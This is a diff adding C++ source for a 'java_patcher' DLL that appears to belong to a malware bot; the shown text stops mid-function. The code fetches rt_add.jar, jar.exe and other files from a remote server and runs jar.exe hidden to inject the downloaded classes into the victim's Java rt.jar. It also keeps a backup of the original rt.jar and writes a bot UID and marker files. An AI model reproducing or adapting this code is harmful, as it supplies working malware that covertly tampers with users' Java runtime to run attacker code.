@@ -1,0 +1,1489 @@
+// java_patcher_dll.cpp : Defines the exported functions for the DLL application.
+//
+
+
+#include "BotHttp.h"
+//#include "LockingProcess.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "GetApi.h"
+#include "Shlobj.h"
+#include "java_patcher.h"
+#include "ntdll.h"
+#include "Utils.h"
+#include "Modules.h"
+
+#include "Richedit.h"
+//#pragma comment(lib, "msvcrt.lib")
+
+#include "BotDebug.h"
+
+
+namespace java_patcher
+{
+    #include "DbgTemplates.h"
+}
+#define OutMessage  java_patcher::DBGOutMessage<>
+
+ 
+
+
+
+
+
+CHAR* GetRegValue(HKEY hKey, CHAR* targValName)
+{
+	bool sw_find = false;
+	int ind = 0;
+	DWORD NameLen = 16383;
+	CHAR* ValName = (CHAR*)MemAlloc(NameLen * sizeof(WCHAR));
+	CHAR* Data = (CHAR*)MemAlloc(MAX_PATH * sizeof(WCHAR));
+	DWORD DataLen = 1024;
+	DWORD res = (DWORD)pRegEnumValueA(hKey, ind, ValName, &NameLen, NULL, NULL, (LPBYTE)Data, &DataLen);
+	while(res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
+	{
+		if(plstrcmpA(ValName, targValName) == 0)
+		{
+			sw_find = true;
+			break;
+		}
+		ind++;
+		res = (DWORD)pRegEnumValueA(hKey, ind, ValName, &NameLen, NULL, NULL, (LPBYTE)Data, &DataLen);
+	}
+
+	MemFree(ValName);
+
+	if(sw_find)
+		return Data;
+	
+	MemFree(Data);
+	return NULL;
+}
+
+CHAR* GetCurrentJavaVersion()
+{
+	HKEY hKey;
+	OutMessage("java_patcher", "GetCurrentJavaVersion()");
+	DWORD res = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment", 0, KEY_READ, &hKey);
+	if(res != ERROR_SUCCESS)
+		return NULL;
+
+	CHAR* CurrVersion = GetRegValue(hKey, "CurrentVersion");
+	pRegCloseKey(hKey);
+	if(CurrVersion != NULL)
+		return CurrVersion;
+
+	return NULL;
+}
+DWORD IsJavaCompatibleVersion()
+{
+	HKEY hKey;
+	DWORD res = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment", 0, KEY_READ, &hKey);
+	if(res != ERROR_SUCCESS)
+		return NULL;
+
+	CHAR* CurrVersion = GetRegValue(hKey, "CurrentVersion");
+	
+	if(m_lstrcmp(CurrVersion,"1.6") == 0)
+	{
+		CHAR* Java6FamilyVersion = GetRegValue(hKey, "Java6FamilyVersion");
+		if(Java6FamilyVersion == NULL)
+		{
+			pRegCloseKey(hKey);
+			MemFree(CurrVersion);
+			return -1;
+		}
+		PCHAR Data = STR::GetRightStr(Java6FamilyVersion,"_",false);
+
+		int iVer=StrToInt(Data);
+		
+		pRegCloseKey(hKey);
+		STR::Free(Data); 
+		MemFree(Java6FamilyVersion);
+		MemFree(CurrVersion);
+
+		if (iVer>=18) {
+			OutMessage("java_patcher", "IsJavaCompatibleVersion() = 2");
+			return 2;
+		}
+		else if(iVer >= 10 && iVer <= 17) {
+			OutMessage("java_patcher", "IsJavaCompatibleVersion() = 1");
+			return 1;
+		}
+		else if(iVer < 10) {
+			OutMessage("java_patcher", "IsJavaCompatibleVersion() = 0");
+			return 0;
+		}
+	}
+	else if (m_lstrcmp(CurrVersion,"1.7") == 0)
+	{
+		pRegCloseKey(hKey);
+		MemFree(CurrVersion);
+		OutMessage("java_patcher", "IsJavaCompatibleVersion() = 3");
+		return 3;
+	}
+
+	return -1;
+}
+CHAR* GetJREPath(DWORD* error)
+{
+	HKEY hKey;
+
+	DWORD res = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Runtime Environment", 0, KEY_READ, &hKey);
+	if(res != ERROR_SUCCESS)
+	{
+		*error = 1;
+		return NULL;
+	}
+
+	CHAR* CurrVersion = GetRegValue(hKey, "CurrentVersion");
+	if(CurrVersion != NULL)
+	{
+		HKEY hKeyCurrVersion;
+		DWORD res = (DWORD)pRegOpenKeyExA(hKey, CurrVersion, 0, KEY_READ, &hKeyCurrVersion);
+		MemFree(CurrVersion);
+		if(res != ERROR_SUCCESS)
+		{
+			*error = 2;
+			pRegCloseKey(hKey);
+			return NULL;
+		}
+		CHAR* JREPath = GetRegValue(hKeyCurrVersion, "JavaHome");
+		pRegCloseKey(hKeyCurrVersion);
+		pRegCloseKey(hKey);
+		if(JREPath != NULL)
+		{
+			*error = 0;
+			return JREPath;
+		}
+		else
+		{
+			*error = 3;
+			return NULL;
+		}
+	}
+
+	return NULL;
+}
+
+CHAR* GetTempNameA()
+{
+	CHAR *TempPath = (CHAR*)MemAlloc( MAX_PATH - 14);
+	CHAR *FileName = (CHAR*)MemAlloc( MAX_PATH );
+
+	if ( !TempPath || !FileName )
+	{
+		return NULL;
+	}
+
+	pGetTempPathA( MAX_PATH - 14, TempPath );
+	pGetTempFileNameA( TempPath,  ("111"), 0, FileName );
+
+	MemFree( TempPath );
+
+	return FileName;
+}
+
+
+
+DWORD UnpackToDir(CHAR* jarFilename, CHAR* dstFolder, CHAR* jarexePath)
+{
+	BOOL bres = (BOOL)pSetCurrentDirectoryA(dstFolder);
+
+	CHAR* rtAdd_folder = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	 plstrcpyA(rtAdd_folder, dstFolder);
+	 plstrcatA(rtAdd_folder,  ("\\rt_add.jar"));
+	 bres = (BOOL)pCopyFileA(jarFilename, rtAdd_folder, FALSE);
+
+	CHAR* cmd = (CHAR*)MemAlloc(MAX_PATH * 2 * sizeof(CHAR));
+	// plstrcpyA(cmd,   ("/c \""));
+	 //plstrcatA(cmd,  jarexePath);
+	 plstrcpyA(cmd,   (" -xf rt_add.jar"));
+
+	OutMessage("java_patcher", cmd);
+
+	SHELLEXECUTEINFOA in;
+	m_memset(&in, 0, sizeof(SHELLEXECUTEINFO));
+
+	in.cbSize = sizeof(SHELLEXECUTEINFO);
+	in.fMask = SEE_MASK_NOCLOSEPROCESS;
+	in.hwnd = NULL;
+	in.lpFile =  jarexePath;//("cmd.exe");
+	in.nShow = SW_HIDE;
+	in.lpParameters = cmd;
+
+	OutMessage("java_patcher", "ShellExecuteEx(0) START");
+	bres = (BOOL)pShellExecuteExA(&in);
+	pWaitForSingleObject(in.hProcess, -1);
+	pTerminateProcess(in.hProcess, 0);
+	OutMessage("java_patcher", bres? ("ShellExecuteEx(0) STOP - 1"): ("ShellExecuteEx(0) STOP - 0"));
+	MemFree(cmd);
+
+	pDeleteFileA(rtAdd_folder);
+
+	MemFree(rtAdd_folder);
+
+	return 0;
+}
+
+DWORD ClearFolder(CHAR* folder)
+{
+	WIN32_FIND_DATAA data;
+	CHAR* search_mask = (CHAR*)MemAlloc(MAX_PATH*sizeof(CHAR));
+	plstrcpyA(search_mask, folder);
+	plstrcatA(search_mask,  ("*"));
+	HANDLE hFind = pFindFirstFileA(search_mask, &data);
+	if(hFind == INVALID_HANDLE_VALUE) return (DWORD)pGetLastError();
+	do
+	{
+		if( plstrcmpA(&data.cFileName[0],  (".")) == 0 ||  plstrcmpA(&data.cFileName[0],  ("..")) == 0) continue;
+		CHAR* filename = (CHAR*)MemAlloc(MAX_PATH*sizeof(CHAR));
+		plstrcpyA(filename, folder);
+		plstrcatA(filename, &data.cFileName[0]);
+		DWORD attr = (DWORD)pGetFileAttributesA(filename);
+
+		if((attr & FILE_ATTRIBUTE_READONLY) == FILE_ATTRIBUTE_READONLY)
+		{
+			attr -= FILE_ATTRIBUTE_READONLY;
+			pSetFileAttributesA(filename, attr);
+		}
+
+		if((attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
+		{
+			 plstrcatA(filename,  ("\\"));
+			ClearFolder(filename);
+			pRemoveDirectoryA(filename);
+		}
+		else
+		{
+			pDeleteFileA(filename);
+		}
+		MemFree(filename);
+	}
+	while(pFindNextFileA(hFind, &data));
+	MemFree(search_mask);
+	pFindClose(hFind);
+	return 0;
+}
+bool UID_To_File()
+{
+ //return true;
+	
+	PCHAR sAppData = STR::Alloc(MAX_PATH * sizeof(CHAR));// (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	pExpandEnvironmentStringsA("%AllUsersProfile%", sAppData, MAX_PATH);
+ 
+	m_lstrcat(sAppData, "/uid.txt");
+	DWORD attr = (DWORD)pGetFileAttributesA(sAppData);
+	
+	if(attr == INVALID_FILE_ATTRIBUTES)
+	{
+		char BotUid[100];
+		GenerateUid(BotUid);
+		if (File::WriteBufferA(sAppData, BotUid, m_lstrlen(BotUid))>0)
+		{
+			STR::Free(sAppData);
+			return true;
+		}
+		else
+		{
+			STR::Free(sAppData);
+			return false;
+		}
+
+	}
+	else
+	{
+		STR::Free(sAppData);
+		return true;
+	}
+}
+
+DWORD Patch(CHAR* user_name, CHAR* tmpRtPath, CHAR* rt_add_Path, CHAR* iniFilePath, CHAR* jarexePath, CHAR* libPath)
+{
+	OutMessage("java_patcher",  ("Unpacking rt_add.jar"));
+	if(UnpackToDir(rt_add_Path, tmpRtPath, jarexePath) != 0)
+	{
+		OutMessage("java_patcher",  ("UnpackToDir(rt_add.jar)  ERROR"));
+		return -1;
+	}
+
+	DWORD error = 0;
+	CHAR* JREPath = GetJREPath(&error);
+	
+	// Сохраняем путь в lib папку jre для возврата
+	plstrcpyA(libPath, JREPath);
+	plstrcatA(libPath,  "\\lib");
+
+	BOOL bres = FALSE;
+	
+	CHAR* sAllUsersProfile = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	pExpandEnvironmentStringsA( ("%ALLUSERSPROFILE%"), sAllUsersProfile, MAX_PATH);
+	OutMessage("java_patcher", sAllUsersProfile);
+
+
+	bres = (BOOL)pSetCurrentDirectoryA(sAllUsersProfile);
+
+	pDeleteFileA( (".\\statusFile.txt"));
+	pDeleteFileA( (".\\unsigned.txt"));
+	pDeleteFileA( (".\\rt.ini"));
+	pDeleteFileA( (".\\file.dat"));
+	pDeleteFileA( (".\\uid.txt"));
+	pDeleteFileA( (".\\rt2.log"));
+
+	OutMessage("java_patcher",  ("Creating: %AllUsersProfile%/uid.txt"));
+
+	bres = (BOOL)pCopyFileA(iniFilePath,  (".\\rt.ini"), FALSE);
+	if(!bres)
+	{
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		return -1;
+	}
+	//OutMessage("java_patcher",  "bres =");
+
+	bres = (BOOL)pSetCurrentDirectoryA(JREPath);
+	//OutMessage("java_patcher",  "bres = (BOOL)pSetCurrentDirectoryA(JREPath);");
+
+	bres = (BOOL)pCopyFileA( (".\\lib\\rt.jar"),  (".\\lib\\rt2.jar"), FALSE);
+	OutMessage("java_patcher", bres? ("rt.jar -> rt2.jar  OK"): ("rt.jar -> rt2.jar  FAIL"));
+	if(!bres)
+	{
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		return -1;
+	}
+
+	bres = (BOOL)pSetCurrentDirectoryA(tmpRtPath);
+
+	CHAR* cmd = (CHAR*)MemAlloc(520*sizeof(CHAR));
+	plstrcpyA(cmd,   (" -uf \""));
+	plstrcatA(cmd,  JREPath);
+	plstrcatA(cmd,   ("\\lib\\rt2.jar\" \".\\"));
+
+	OutMessage("java_patcher", cmd);
+
+	SHELLEXECUTEINFOA in;
+	m_memset(&in, 0, sizeof(SHELLEXECUTEINFO));
+
+	in.cbSize = sizeof(SHELLEXECUTEINFO);
+	in.fMask = SEE_MASK_NOCLOSEPROCESS;
+	in.hwnd = NULL;
+	in.lpFile =  jarexePath;//("cmd.exe");
+	in.nShow = SW_HIDE;
+	in.lpParameters = cmd;
+
+	OutMessage("java_patcher",  ("ShellExecuteEx(1) START"));
+	bres = (BOOL)pShellExecuteExA(&in);
+	if(!bres)
+	{
+		MemFree(cmd);
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		return -1;
+	}
+
+	pWaitForSingleObject(in.hProcess, -1);
+	OutMessage("java_patcher", bres? ("ShellExecuteEx(1) STOP - 1"): ("ShellExecuteEx(1) STOP - 0"));
+	MemFree(cmd);
+
+	bres = (BOOL)pSetCurrentDirectoryA(JREPath);
+
+	bres = (BOOL)pCopyFileA(".\\lib\\rt.jar", ".\\lib\\rt_.jar", TRUE);
+	if(!bres && (DWORD)pGetLastError() != ERROR_FILE_EXISTS)
+	{
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		OutMessage("java_patcher", "Err: Can`t copy rt.jar -> rt_.jar");
+		return -1;
+	}
+	bres = (BOOL)pCopyFileA( (".\\lib\\rt.jar"),  (".\\lib\\rtB.jar"), FALSE);
+	if(!bres)
+	{
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		OutMessage("java_patcher", "Err: Can`t copy rt.jar -> rtB.jar");
+		return -1;
+	}
+
+	//OutMessage("java_patcher",  ("Killing processes"));
+	//OutMessage("java_patcher",  ("MoveFileEx"));
+	//pMoveFileExA("\\lib\\rt2.jar","\\lib\\rt.jar",MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT);
+
+	CHAR* PathToFlagFile = (CHAR*)MemAlloc(MAX_PATH);
+	plstrcpyA(PathToFlagFile, sAllUsersProfile);
+	plstrcatA(PathToFlagFile,  ("\\copy.dat"));
+	HANDLE hFlagFile = pCreateFileA(PathToFlagFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if(hFlagFile != INVALID_HANDLE_VALUE)
+		pCloseHandle(hFlagFile);
+	else
+	{
+		OutMessage("java_patcher",  ("ERR: Can`t create 'copy.txt'"));
+		MemFree(PathToFlagFile);
+		MemFree(JREPath);
+		MemFree(sAllUsersProfile);
+		return -1;
+	}
+		
+	MemFree(PathToFlagFile);
+	MemFree(JREPath);
+	MemFree(sAllUsersProfile);
+
+	OutMessage("java_patcher",  ("Done!"));
+
+	return 0;
+}
+
+unsigned long getCRC32(char *pchBuf, int nBufLen)
+{ 
+	int i; 
+	int nIndex; 
+	char ch; 
+	unsigned long res; 
+	unsigned long table [] = {
+		0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,
+		0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
+		0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
+		0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
+
+		0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,
+		0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
+		0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
+		0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
+
+		0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
+		0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
+		0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,
+		0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
+
+		0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
+		0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
+		0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
+		0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
+
+		0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,
+		0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
+		0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
+		0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
+
+		0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
+		0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
+		0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,
+		0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
+
+		0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,
+		0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
+		0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
+		0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
+
+		0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,
+		0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
+		0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
+		0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
+
+		0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
+		0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
+		0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
+		0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
+
+		0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,
+		0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
+		0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
+		0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
+
+		0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,
+		0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
+		0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,
+		0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
+
+		0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
+		0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
+		0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,
+		0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
+
+		0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
+		0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
+		0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
+		0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
+
+		0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,
+		0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
+		0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,
+		0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
+
+		0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
+		0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
+		0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,
+		0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
+
+		0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,
+		0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
+		0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
+		0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
+	}; 
+
+	res = 0xFFFFFFFF; 
+	for (i=0;i<nBufLen+4;i++) 
+	{ 
+		nIndex = (res >> 24) & 0xFF; 
+		if (i<nBufLen)
+			ch = pchBuf[ i ]; 
+		else
+			ch = 0x0; 
+		res = (res << 8) | ch; 
+		res ^= table[nIndex]; 
+	} 
+
+     return res; 
+}
+/*
+rt_add.jar=2607978363
+rt.ini=3499486576
+6_jar.exe=4039271118
+6_jli.dll=3139858861
+6_msvcr71.dll=987786152
+7_jar.exe=2819675814
+7_jli.dll=2283789432
+7_msvcr100.dll=3273002548
+*/
+typedef struct _FILE_CRC32
+{
+	char* fileName;
+	unsigned long crc32;
+} FILES_CRC32, *PFILES_CRC32;
+
+LPVOID DownloadPlugin( char *Url, DWORD *dwLen, bool crypt )
+{
+	PCHAR data;
+	THTTPResponse Response;
+	ClearStruct(Response);
+	HTTP::Get(Url,&data,&Response);
+	*dwLen=Response.ContentLength;
+	return data;
+}
+
+
+DWORD DecToDWORD(char* val)
+{
+	DWORD d = 0;
+	for(; val[0] != 0; val++)
+	{
+		d *= 10;
+		d += val[0] - '0';
+	}
+	return d;
+}
+
+PFILES_CRC32 LoadCorrectCRC32(char* base_url)
+{
+	PFILES_CRC32 files_crc32 = NULL;
+	int count = 0;
+	char* url = (char*)MemAlloc(512);
+	m_lstrcpy(url, base_url);
+	m_lstrcat(url, "/CRC32.txt");
+	DWORD crc32Len = 0;
+	OutMessage("java_patcher", "DownloadPlugin");
+	OutMessage("java_patcher", url);
+
+	
+
+	
+	char* crc32Data = (char*)DownloadPlugin(url, &crc32Len, false);
+	if (!crc32Data)
+	{
+		OutMessage("java_patcher", "LoadCorrectCRC32 DownloadPlugin Failed");
+		return 0;
+	}
+	else
+	{
+		char* context1 = NULL;
+		for(char* part = m_strtok_s(crc32Data, "\r\n", &context1); part != NULL; part = m_strtok_s(NULL, "\r\n", &context1))
+		{
+			files_crc32 = (PFILES_CRC32)MemRealloc(files_crc32, (count + 2) * sizeof(FILES_CRC32));
+			m_memset(files_crc32 + count + 1, 0, sizeof(FILES_CRC32));
+
+			char* context2 = NULL;
+			char* key = m_strtok_s(part, "=", &context2);
+			char* val = m_strtok_s(NULL, "=", &context2);
+
+			(files_crc32 + count)->fileName = (char*)MemAlloc(m_lstrlen(key));
+			m_lstrcpy((files_crc32 + count)->fileName, key);
+			(files_crc32 + count)->crc32 = (unsigned long)DecToDWORD(val);
+			count++;
+		}
+	};
+	MemFree(url);
+
+	return files_crc32;
+}
+
+unsigned long GetCorrectCRC32(PFILES_CRC32 files_crc32, char* fileName)
+{
+	while(files_crc32->crc32 != 0)
+	{
+		if(m_lstrcmp(files_crc32->fileName, fileName) == 0)
+			return files_crc32->crc32;
+		files_crc32++;
+	}
+	return 0;
+}
+
+DWORD DownloadAndSave(char* base_url, CHAR* rtAddFilePath, CHAR* iniFilePath, CHAR* jarExeFilePath)
+{
+
+	CHAR* javaVer = GetCurrentJavaVersion();
+	if(javaVer == NULL)
+	{
+		OutMessage("java_patcher", ("Can`t determine java current version"));
+		return -1;
+	}
+	if( m_lstrcmp(javaVer, "1.6") != 0 && m_lstrcmp(javaVer, "1.7") != 0)
+		return -1;
+
+	int ver = IsJavaCompatibleVersion();
+
+	OutMessage("java_patcher",  "LoadCorrectCRC32");
+	PFILES_CRC32 files_crc32 = LoadCorrectCRC32(base_url);
+
+	if (! files_crc32 )
+	{
+		OutMessage("java_patcher",  "Failed Download CRC32" );
+		return -1;
+	};
+	//pSleep(10000);
+	OutMessage("java_patcher",  "Start Downloading");
+	{
+		char* url = (char*)MemAlloc(512);
+		m_lstrcpy(url, base_url);
+		switch(ver)
+		{
+		case 1:
+			m_lstrcat(url, "6u17/rt_add.jar");
+			OutMessage("java_patcher",  "VER: 6u17");
+			break;
+		case 2:
+			m_lstrcat(url, "6u18/rt_add.jar");
+			OutMessage("java_patcher",  "VER: 6u18");
+			break;
+		case 3:
+			m_lstrcat(url, "7uXX/rt_add.jar");
+			OutMessage("java_patcher",  "VER: 7uXX");
+			break;
+		default:
+			m_lstrcat(url, "6u17/rt_add.jar");
+			OutMessage("java_patcher",  "VER: 6u17 - DEFAULT");
+			break;
+		}
+		DWORD rtAddLen = 0;
+
+		LPVOID rtAddData = DownloadPlugin(url, &rtAddLen, false);
+		if  (! rtAddData) 
+			return 0; 
+
+		unsigned long crc = getCRC32((char*)rtAddData, rtAddLen);
+		unsigned long crc_c = 0;
+		switch(ver)
+		{
+		case 1:
+			crc_c = GetCorrectCRC32(files_crc32, "6u17_rt_add.jar");
+			break;
+		case 2:
+			crc_c = GetCorrectCRC32(files_crc32, "6u18_rt_add.jar");
+			break;
+		case 3:
+			crc_c = GetCorrectCRC32(files_crc32, "7uXX_rt_add.jar");
+			break;
+		default:
+			crc_c = GetCorrectCRC32(files_crc32, "6u17_rt_add.jar");
+			break;
+		}
+		if(crc != crc_c)
+		{
+			OutMessage("java_patcher",  ("CRC32: rt_add.jar incorrect checksum"));
+			return -1;
+		}
+		
+		CHAR* tmpPath = GetTempNameA();
+		m_lstrcpy(rtAddFilePath, tmpPath);
+		OutMessage("java_patcher", rtAddFilePath);
+		MemFree(tmpPath);
+		HANDLE hFile = pCreateFileA(rtAddFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: Can`t create %temp%\\rt.jar"));
+			OutMessage("java_patcher", rtAddFilePath);
+			return -1;
+		}
+		DWORD BitesWritten = 0;
+		pWriteFile(hFile, rtAddData, rtAddLen, &BitesWritten, NULL);
+		if(BitesWritten != rtAddLen)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: BitesWritten != rtAddLen"));
+			return -1;
+		}
+		pCloseHandle(hFile);
+		
+		
+			
+		OutMessage("java_patcher",  "--- 111");
+		MemFree(url);
+		//pSleep(10000);
+		//OutMessage("java_patcher",  "--- 222");
+		//MemFree(rtAddData);
+		//pSleep(10000);
+
+		OutMessage("java_patcher",  ("Downloaded: rt_add.jar"));
+	}
+	//pSleep(20000);
+	{
+		char* url = (char*)MemAlloc(512);
+		m_lstrcpy(url, base_url);
+		m_lstrcat(url, "/rt.ini");
+
+		DWORD rtIniLen = 0;
+		LPVOID rtIniData = DownloadPlugin(url, &rtIniLen, false);
+		if ( ! rtIniData )
+		{
+			OutMessage("java_patcher",  "Failed Download rt.ini" );
+			return -1;
+		};
+		unsigned long crc = getCRC32((char*)rtIniData, rtIniLen);
+		unsigned long crc_c = GetCorrectCRC32(files_crc32, "rt.ini");
+		if(crc != crc_c)
+		{
+			OutMessage("java_patcher",  ("CRC32: rt.ini incorrect checksum"));
+			return -1;
+		}
+		CHAR* tmpPath = GetTempNameA();
+		m_lstrcpy(iniFilePath, tmpPath);
+		MemFree(tmpPath);
+		OutMessage("java_patcher", iniFilePath);
+		HANDLE hFile = pCreateFileA(iniFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+		{
+			//err = GetLastError();
+			OutMessage("java_patcher",  ("RT PATCH: Can`t create %temp%\\rt.ini"));
+			OutMessage("java_patcher", iniFilePath);
+			return -1;
+		}
+		DWORD BitesWritten = 0;
+		pWriteFile(hFile, rtIniData, rtIniLen, &BitesWritten, NULL);
+		if(BitesWritten != rtIniLen)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: BitesWritten != rtIniLen"));
+			return -1;
+		}
+		pCloseHandle(hFile);
+		//MemFree(rtIniData);
+		MemFree(url);
+
+		OutMessage("java_patcher",  ("Downloaded: rt.ini"));
+	}
+	//pSleep(20000);
+	{
+		char* url = (char*)MemAlloc(512);
+		m_lstrcpy(url, base_url);
+		if(m_lstrcmp(javaVer, "1.6") == 0)
+			m_lstrcat(url, "6/jar.exe");
+		else if(plstrcmpA(javaVer, "1.7") == 0)
+			m_lstrcat(url, "7/jar.exe");
+
+		DWORD jarExeLen = 0;
+		LPVOID jarExeData = DownloadPlugin(url, &jarExeLen, false);
+		if ( ! jarExeData )
+		{
+			OutMessage("java_patcher",  "Failed Download jar.exe" );
+			return -1;
+		};
+		unsigned long crc = getCRC32((char*)jarExeData, jarExeLen);
+		unsigned long crc_c = 0;
+		if(m_lstrcmp(javaVer,  "1.6") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "6_jar.exe");
+		else if(plstrcmpA(javaVer,  "1.7") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "7_jar.exe");
+		if(crc != crc_c)
+		{
+			OutMessage("java_patcher",  ("CRC32: jar.exe incorrect checksum"));
+			return -1;
+		}
+
+		pGetTempPathA(MAX_PATH, jarExeFilePath);
+		m_lstrcat(jarExeFilePath,  ("jar.exe"));
+		OutMessage("java_patcher", jarExeFilePath);
+		HANDLE hFile = pCreateFileA(jarExeFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+		{
+			//err = GetLastError();
+			OutMessage("java_patcher",  ("RT PATCH: Can`t create %temp%\\jar.exe"));
+			OutMessage("java_patcher", jarExeFilePath);
+			return -1;
+		}
+		DWORD BitesWritten = 0;
+		pWriteFile(hFile, jarExeData, jarExeLen, &BitesWritten, NULL);
+		if(BitesWritten != jarExeLen)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: BitesWritten != jarExeLen"));
+			return false;
+		}
+		pCloseHandle(hFile);
+		//MemFree(jarExeData);
+		MemFree(url);
+
+		OutMessage("java_patcher",  ("Downloaded: jar.exe"));
+	}
+	//pSleep(20000);
+	{
+		char* url = (char*)MemAlloc(512);
+		m_lstrcpy(url, base_url);
+		if(m_lstrcmp(javaVer, "1.6") == 0)
+			m_lstrcat(url, "6/jli.dll");
+		else if(plstrcmpA(javaVer, "1.7") == 0)
+			m_lstrcat(url, "7/jli.dll");
+
+		DWORD jliDllLen = 0;
+		LPVOID jliDllData = DownloadPlugin(url, &jliDllLen, false);
